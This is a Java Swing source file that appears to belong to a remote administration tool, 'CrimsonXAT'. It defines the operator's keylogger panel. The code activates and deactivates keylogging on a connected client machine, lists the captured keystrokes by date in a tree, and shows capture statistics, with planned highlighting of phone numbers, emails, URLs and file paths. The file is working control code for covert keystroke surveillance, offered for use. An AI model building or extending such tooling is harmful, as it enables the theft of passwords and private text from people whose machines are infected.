/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.server.graphics.panels.cp.desktop;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.ComponentOrientation;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.GridBagConstraints;
import java.awt.Insets;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTree;
import javax.swing.SwingConstants;
import javax.swing.border.BevelBorder;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreeSelectionModel;

import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.ControlPanel;
import subterranean.crimson.server.graphics.ExportKeylogs;
import subterranean.crimson.server.graphics.KeyLogPane;
import subterranean.crimson.server.graphics.StatusLights;
import subterranean.crimson.server.graphics.panels.cp.CPanel;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.containers.Key;
import subterranean.crimson.universal.containers.KeyloggerLog;

import javax.swing.BoxLayout;

public class SPKeylogger extends CPanel {

	private static final long serialVersionUID = 1L;
	private JTabbedPane keyloggerTabbedPane;
	private JPanel selection_panel;
	private JPanel logs_panel;
	private JTree keylog_tree;
	private DefaultMutableTreeNode tree_root;
	private KeyLogPane content;
	private DefaultTreeModel treeModel;
	private JLabel lblOnline;
	private JButton btnStartKeylogger;
	private JButton btnStopKeylogger;
	private StatusLights status_lights;

	private ControlPanel cp;
	private JLabel total_captured;
	private JLabel average;
	private JLabel last;
	private JLabel first;

	public SPKeylogger(final ControlPanel cpp) {
		cp = cpp;

		lblOnline = new JLabel("state");
		lblOnline.setBounds(80, 36, 90, 15);

		btnStartKeylogger = new JButton("Activate");
		btnStartKeylogger.setBounds(167, 12, 117, 25);

		btnStopKeylogger = new JButton("Deactivate");
		btnStopKeylogger.setBounds(167, 47, 117, 25);

		// create the root node
		tree_root = new DefaultMutableTreeNode("Logs");

		for (Date d : cp.c.getProfile().log.getDates()) {
			// add it to the jtree

			String name = d.toString();
			// take out time
			name = name.substring(0, 10) + name.substring(23);
			// Logger.add("Adding date to tree: " + name);
			DefaultMutableTreeNode addition = new DefaultMutableTreeNode(name);

			tree_root.add(addition);

		}
		treeModel = new DefaultTreeModel(tree_root);
		setLayout(new BorderLayout(0, 0));

		keyloggerTabbedPane = new JTabbedPane(JTabbedPane.TOP);
		keyloggerTabbedPane.setPreferredSize(new Dimension(559, 265));
		add(keyloggerTabbedPane);

		JPanel settings_panel = new JPanel();
		settings_panel.setComponentOrientation(ComponentOrientation.LEFT_TO_RIGHT);
		settings_panel.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
		keyloggerTabbedPane.addTab("Settings", null, settings_panel, null);
		settings_panel.setLayout(new BoxLayout(settings_panel, BoxLayout.Y_AXIS));

		JPanel stats_panel = new JPanel();
		stats_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Statistics", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		settings_panel.add(stats_panel);
		stats_panel.setLayout(null);

		JLabel lblKeysCaptured = new JLabel("Total Keys Captured:");
		lblKeysCaptured.setHorizontalAlignment(SwingConstants.TRAILING);
		lblKeysCaptured.setBounds(12, 23, 149, 15);
		stats_panel.add(lblKeysCaptured);

		total_captured = new JLabel("");
		total_captured.setBounds(173, 23, 81, 15);
		stats_panel.add(total_captured);

		JLabel lblAverageKeysPer = new JLabel("Average per Day:");
		lblAverageKeysPer.setHorizontalAlignment(SwingConstants.TRAILING);
		lblAverageKeysPer.setBounds(12, 53, 149, 15);
		stats_panel.add(lblAverageKeysPer);

		average = new JLabel("");
		average.setBounds(173, 53, 81, 15);
		stats_panel.add(average);

		JLabel lblLastCapture = new JLabel("Last Capture:");
		lblLastCapture.setHorizontalAlignment(SwingConstants.TRAILING);
		lblLastCapture.setBounds(313, 23, 112, 15);
		stats_panel.add(lblLastCapture);

		JLabel lblNewLabel = new JLabel("First Capture:");
		lblNewLabel.setHorizontalAlignment(SwingConstants.TRAILING);
		lblNewLabel.setBounds(313, 53, 112, 15);
		stats_panel.add(lblNewLabel);

		last = new JLabel("");
		last.setBounds(437, 23, 169, 15);
		stats_panel.add(last);

		first = new JLabel("");
		first.setBounds(437, 53, 169, 15);
		stats_panel.add(first);

		JPanel cp_panel = new JPanel();
		cp_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Control", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		settings_panel.add(cp_panel);
		cp_panel.setLayout(null);

		cp_panel.add(btnStartKeylogger);

		cp_panel.add(btnStopKeylogger);

		JButton btnExportLogs = new JButton("Export Logs");
		btnExportLogs.setEnabled(false);
		btnExportLogs.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				ExportKeylogs ek = new ExportKeylogs();
				ek.setVisible(true);

			}
		});
		btnExportLogs.setBounds(326, 30, 117, 25);
		cp_panel.add(btnExportLogs);

		JButton btnClearRemoteCache = new JButton("Clear Remote Cache");
		btnClearRemoteCache.setEnabled(false);
		btnClearRemoteCache.setFont(new Font("Dialog", Font.BOLD, 10));
		btnClearRemoteCache.setBounds(455, 30, 151, 25);
		cp_panel.add(btnClearRemoteCache);

		cp_panel.add(lblOnline);

		lblOnline.setFont(new Font("Dialog", Font.BOLD, 14));
		lblOnline.setForeground(new Color(0, 102, 0));

		JLabel lblStatus = new JLabel("Status: ");
		lblStatus.setBounds(12, 36, 56, 15);
		cp_panel.add(lblStatus);

		status_lights = new StatusLights();
		status_lights.setBounds(66, 29, 9, 25);
		cp_panel.add(status_lights);

		JPanel filtering_panel = new JPanel();
		filtering_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Filtering", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		settings_panel.add(filtering_panel);
		
		JLabel lblComingSoon = new JLabel("Coming Soon");
		filtering_panel.add(lblComingSoon);

		JPanel highlighting_panel = new JPanel();
		highlighting_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Highlighting", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		settings_panel.add(highlighting_panel);
		highlighting_panel.setLayout(null);

		JCheckBox chckbxPhoneNumbers = new JCheckBox("Phone Numbers");
		chckbxPhoneNumbers.setEnabled(false);
		chckbxPhoneNumbers.setBounds(8, 20, 143, 23);
		highlighting_panel.add(chckbxPhoneNumbers);

		JCheckBox chckbxEmailAddresses = new JCheckBox("Email Addresses");
		chckbxEmailAddresses.setEnabled(false);
		chckbxEmailAddresses.setBounds(8, 47, 143, 23);
		highlighting_panel.add(chckbxEmailAddresses);

		JCheckBox chckbxUrls = new JCheckBox("URLs");
		chckbxUrls.setEnabled(false);
		chckbxUrls.setBounds(232, 20, 129, 23);
		highlighting_panel.add(chckbxUrls);

		JCheckBox chckbxFilePaths = new JCheckBox("File Paths");
		chckbxFilePaths.setEnabled(false);
		chckbxFilePaths.setBounds(232, 47, 129, 23);
		highlighting_panel.add(chckbxFilePaths);

		GridBagConstraints gbc_lblOnline = new GridBagConstraints();
		gbc_lblOnline.anchor = GridBagConstraints.NORTHWEST;
		gbc_lblOnline.insets = new Insets(0, 0, 5, 5);
		gbc_lblOnline.gridx = 1;
		gbc_lblOnline.gridy = 0;

		btnStopKeylogger.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (!btnStopKeylogger.isEnabled()) {
					return;
				}
				if (cp.c.getProfile().info.isKeylogging() == false) {
					// no action
				} else {
					cp.c.getProfile().info.setKeylogging(false);
					ClientCommands.stopKeylogger(cp.c);
					lblOnline.setText("OFFLINE");
					lblOnline.setForeground(Color.RED);
					status_lights.replaceLight(Color.RED, 1);

					// adjust buttons
					btnStopKeylogger.setEnabled(false);
					btnStartKeylogger.setEnabled(true);

				}
			}
		});

		btnStartKeylogger.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (!btnStartKeylogger.isEnabled()) {
					return;
				}
				if (cp.c.getProfile().info.isKeylogging() == true) {
					// do nothing
				} else {
					cp.c.getProfile().info.setKeylogging(true);
					ClientCommands.startKeylogger(cp.c);
					lblOnline.setText("ONLINE");
					lblOnline.setForeground(Color.GREEN);

					// adjust buttons
					btnStartKeylogger.setEnabled(false);
					btnStopKeylogger.setEnabled(true);
					status_lights.replaceLight(Color.GREEN, 3);

				}
			}
		});

		logs_panel = new JPanel();

		logs_panel.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {

				// get all dates
				Date[] dates = cp.c.getProfile().log.getDates();
				for (Date d : dates) {
					// add it to the jtree
					Logger.add("Adding date to tree: " + d.toString());
					DefaultMutableTreeNode addition = new DefaultMutableTreeNode(d.toString());
					tree_root.add(addition);

				}

			}
		});

		keyloggerTabbedPane.addTab("Logs", null, logs_panel, null);
		logs_panel.setLayout(new BorderLayout(0, 0));

		selection_panel = new JPanel();
		selection_panel.setBorder(null);
		logs_panel.add(selection_panel, BorderLayout.WEST);
		selection_panel.setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane_7 = new JScrollPane();
		selection_panel.add(scrollPane_7);
		keylog_tree = new JTree(treeModel);
		keylog_tree.setPreferredSize(new Dimension(160, 20));
		keylog_tree.getSelectionModel().setSelectionMode(TreeSelectionModel.SINGLE_TREE_SELECTION);

		keylog_tree.getSelectionModel().addTreeSelectionListener(new TreeSelectionListener() {
			@Override
			public void valueChanged(TreeSelectionEvent e) {
				DefaultMutableTreeNode selectedNode = (DefaultMutableTreeNode) keylog_tree.getLastSelectedPathComponent();
				// open the date in the content pane
				String s = null;
				try {
					s = selectedNode.toString();
				} catch (NullPointerException e1) {
					return;
				}
				SimpleDateFormat format = new SimpleDateFormat("EEE MMM dd yyyy");
				Date d = null;
				try {
					if (s.equals("Logs")) {
						// this is the root; return
						content.clear();
						return;
					}
					d = format.parse(s);
				} catch (ParseException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				// clear the content box
				content.clear();
				ArrayList<Key> keys = cp.c.getProfile().log.getKeys(d);
				Logger.add("Got " + keys.size() + " for this date");

				content.loadData(keys);

			}
		});

		scrollPane_7.setViewportView(keylog_tree);

		JPanel content_panel = new JPanel();
		logs_panel.add(content_panel);
		content_panel.setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane_8 = new JScrollPane();
		content_panel.add(scrollPane_8);

		content = new KeyLogPane();
		content.setEditable(false);
		scrollPane_8.setViewportView(content);

		if (cp.c.getProfile().info.isKeylogging()) {
			lblOnline.setText("ONLINE");
			lblOnline.setForeground(new Color(0, 102, 0));
			btnStartKeylogger.setEnabled(false);
			btnStopKeylogger.setEnabled(true);
			status_lights.replaceLight(Color.GREEN, 3);
		} else {
			lblOnline.setText("OFFLINE");
			lblOnline.setForeground(Color.RED);
			btnStartKeylogger.setEnabled(true);
			btnStopKeylogger.setEnabled(false);
			status_lights.replaceLight(Color.RED, 1);
		}
		updateStatistics();
	}

	public void updateKeylogger() {
		// Logger.debug("Running Keylogger update. KLog has: " +
		// c.profile.log.keydays.size() + " days");
		SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd yyyy");
		for (Date d : cp.c.getProfile().log.getDates()) {
			// add it to the jtree

			String name = df.format(d);

			// Logger.add("Testing if: " + name + " is already in the tree");
			// check if its already in the tree
			DefaultMutableTreeNode node = null;
			Enumeration e = tree_root.breadthFirstEnumeration();
			boolean add = true;
			while (e.hasMoreElements()) {
				node = (DefaultMutableTreeNode) e.nextElement();
				if (name.equals(node.getUserObject().toString())) {
					// node is already in the tree
					// Logger.add("Node already in tree");
					add = false;
					break;
				}
			}

			if (add) {
				// add node to the tree
				// Logger.add("Adding node to tree");
				DefaultMutableTreeNode childNode = new DefaultMutableTreeNode(name);
				treeModel.insertNodeInto(childNode, tree_root, tree_root.getChildCount());
			}

		}
		treeModel.reload();

		String s = null;
		try {
			// update contentpane
			DefaultMutableTreeNode selectedNode = (DefaultMutableTreeNode) keylog_tree.getLastSelectedPathComponent();
			// open the date in the content pane

			s = selectedNode.toString();
		} catch (NullPointerException e) {
			return;
		}

		Date d = null;
		try {
			if (s.equals("Logs")) {
				// this is the root; return
				return;
			}
			d = df.parse(s);
		} catch (ParseException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		// clear the content box
		content.setText("");
		ArrayList<Key> keys = cp.c.getProfile().log.getKeys(d);

		content.loadData(keys);
		updateStatistics();
	}

	public void updateStatistics() {

		KeyloggerLog klog = cp.c.getProfile().log;
		total_captured.setText("" + klog.totalKeys());
		average.setText("" + klog.averageKeys());
		if (klog.keydays.size() > 0) {
			SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd yyyy");
			first.setText(df.format(klog.keydays.get(0).date));
			last.setText(df.format(klog.keydays.get(klog.keydays.size() - 1).date));
		} else {
			first.setText("none");
			last.setText("none");
		}

	}

	@Override
	public void changedConnectionState(boolean connected) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void refresh() {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void deinitialize() {
		// TODO Auto-generated method stub
		
	}

	@Override
	public String getPanelName() {
		return "keylogger";
	}
}
